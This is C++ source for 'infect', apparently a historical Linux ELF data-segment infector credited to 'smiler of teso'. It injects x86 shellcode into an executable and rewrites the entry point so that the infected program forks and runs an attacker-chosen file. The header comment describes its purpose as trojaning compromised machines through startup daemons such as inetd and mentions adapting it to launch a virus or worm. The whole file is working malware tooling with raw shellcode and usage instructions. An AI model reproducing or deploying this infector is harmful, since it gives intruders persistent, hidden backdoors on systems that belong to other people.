/* data segment infector 
 *
 * some simple code is inserted into the executable and the entry point changed
 * so that when run, it forks off and run your program
 *
 * the patched executable will be placed in the file 'tmp.out'. its then upto
 * you to fix permissions and access times etc...
 * 
 * the idea behind this program is to make it easy to trojan hacked boxes,
 * by inserting code into a daemon which is only run at startup.
 * granted running background processes is not the best way to trojan a box
 * but you still might want to load a kernel module... and it beats catting
 * something into the rc scripts ;-)
 *
 * only works on linux x86. i'll try and port it to other ELF x86 OSes
 * when i can be arsed cleaning up this code. and i'll port it to other 
 * ELF architectures when somebody buys me a sparc ;-)
 *
 * basic usage:
 * ./infect /usr/sbin/inetd /tmp/my_elite_and_really_discrete_hax0r_script
 *
 * this could in theory be adapted to insert any code you want, e.g. start a
 * virus/worm going.
 *
 * coded by smiler of teso
 * based heavily on silvio's data-infection.c
 *
 * comments / criticisms to smiler@tasam.com
 */

#include <iostream.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/errno.h>
#include <unistd.h>
#include "elf_help.h"

struct {
	int	length; /* the length of just the asm part of the code */
	int	entry; /* offset to where to insert original entry point */
	int	file_size; /* offset to where to insert size of filename */
} code_stats =	{
		52, 11, 26
		};

char	code[]=
	"\x31\xc0\xb0\x02\xcd\x80\x3c\x00\x74\x25\xbd\x41\x41"
	"\x41\x41\xff\xe5\x31\xc0\x31\xd2\xb0\x0b\x5b\x8d\x8b"
	"\xaa\x00\x00\x00\x88\x11\xfe\xc1\x89\x19\x89\x51\x04"
	"\xcd\x80\x31\xc0\xfe\xc0\xcd\x80\xe8\xdd\xff\xff\xff"
	/* make sure we have enough space in the buffer to store the filename */
	"godelescherbachhilbertfermatgaussramanujanhardyeuler";

int
elf_find_data (ELF *elf, Elf32_Ehdr *ehdr, Elf32_Phdr *phdr)
{
	int	i;

	for (i = 0; i < ehdr->e_phnum; i++) {
		try {
			elf->read_phdr (i, phdr);
		} catch (elf_fault ef) {
			return (-1);	
		}
		if (phdr->p_offset && phdr->p_type == PT_LOAD) {
			cerr << "data phdr at " << i << endl;
			return (0);
		}
	}
	return (-1);
}

int
fd_copy (int fd_from, int fd_to, int off_from, int off_to, int len)
{
	unsigned char	buf[4096];
	int		n;

	if (len == -1) {
		struct stat stat;

		fstat (fd_from, &stat);
		len = stat.st_size - off_from;
	}

	if (off_from != -1)
		lseek (fd_from, off_from, SEEK_SET);

	if (off_to != -1)
		lseek (fd_to, off_to, SEEK_SET);

	while (len > 0) {
		if (len >= 4096) {
			n = 4096;
			len -= 4096;
		} else {
			n = len;
			len = 0;
		}

		n = read (fd_from, buf, n);
		if (n < 0)
			return (-1);
		if (write (fd_to, buf, n) < 0)
			return (-1);
	}

	return (0);
}

void
update_headers (ELF *elf, int new_fd, Elf32_Phdr *data, int size)
{
	Elf32_Ehdr	ehdr;
	Elf32_Shdr	*shdrs;
	Elf32_Phdr	*phdrs;
	int		i,
			flag = 0;

	memcpy (&ehdr, elf->ehdr_get (), sizeof (Elf32_Ehdr));

	shdrs = (Elf32_Shdr *)malloc(sizeof(Elf32_Shdr)*ehdr.e_shnum);
	phdrs = (Elf32_Phdr *)malloc(sizeof(Elf32_Phdr)*ehdr.e_phnum);
	/* read in and patch the section headers */
	for (i = 0; i < ehdr.e_shnum; i++) {
		elf->read_shdr (i, &shdrs[i]);
		if (shdrs[i].sh_offset >= (data->p_offset + data->p_filesz)) {
			shdrs[i].sh_offset += size;
		}
	}
	ehdr.e_entry = data->p_vaddr + data->p_memsz;

	for (i = 0; i < ehdr.e_phnum; i++) {
		elf->read_phdr (i, &phdrs[i]);
		if (phdrs[i].p_type == PT_DYNAMIC)
			continue;
		if (phdrs[i].p_offset == data->p_offset) {
			phdrs[i].p_filesz += size;
			phdrs[i].p_memsz += size;	
			flag = 1;
		} else if (flag) {
			phdrs[i].p_offset += size;
		}
	}
	if (ehdr.e_shoff > data->p_offset)
		ehdr.e_shoff += size;
	if (ehdr.e_phoff > data->p_offset)
		ehdr.e_phoff += size;
	/* write the new elf header */
	lseek (new_fd, 0, SEEK_SET);
	write (new_fd, &ehdr, sizeof (Elf32_Ehdr));

	/* write the section headers */
	lseek (new_fd, ehdr.e_shoff, SEEK_SET);
	write (new_fd, shdrs, sizeof (Elf32_Shdr) * ehdr.e_shnum);

	/* write the new process headers */
	lseek (new_fd, ehdr.e_phoff, SEEK_SET);
	write (new_fd, phdrs, sizeof (Elf32_Phdr) * ehdr.e_phnum);

	return;
}

int
main (int argc, char **argv)
{
	Elf32_Ehdr	*ehdr = NULL;
	Elf32_Phdr	phdr;
	ELF		*elf = NULL;

	cout << "infect 0.1 by smiler / teso" << endl;

	if (argc < 3) {
		cerr << "usage: " << argv[0] << " <file> <file to run>" << endl;
		exit (-1);
	}

	strcpy (code + code_stats.length, argv[2]);
	/* space for the name and some leeway for when the code runs */
	code_stats.length += strlen (argv[2]) + 10;
	*(code + code_stats.file_size) = (unsigned char)strlen(argv[2]);
	
	try {
		elf = new ELF (argv[1], 0);
	} catch (elf_fault ef) {
		delete elf;
		ef.print_exit (-1);
	}

	ehdr =  elf->ehdr_get ();

	*(unsigned long *)(code + code_stats.entry) = ehdr->e_entry;

	if (elf_find_data (elf, ehdr, &phdr)) {
		cerr << "couldn't find data segment :\\" << endl;
		delete elf;
		return (-1);
	}

	int	new_file,
		bss_len;

	new_file = open ("tmp.out", O_WRONLY|O_CREAT|O_TRUNC);
	if (new_file < 0) {
		cerr << "open: " << strerror (errno) << endl;
		delete elf;
		return (-1);
	}

	/* calculate the bss length as this needs to be hacked later */
	bss_len = phdr.p_memsz - phdr.p_filesz;
	cout << "bss_len = " << bss_len << endl;

	fd_copy(elf->filed(), new_file,
		0, 0,
		phdr.p_offset + phdr.p_filesz); 
	fd_copy(elf->filed(), new_file,
		phdr.p_offset + phdr.p_filesz,
		phdr.p_offset + phdr.p_filesz + bss_len + code_stats.length,
		-1);

	update_headers (elf, new_file, &phdr, bss_len + code_stats.length);
	lseek (new_file, phdr.p_offset + phdr.p_filesz + bss_len, SEEK_SET);
	write (new_file, code, code_stats.length);

	close (new_file);
	delete elf;
	return (0);
}
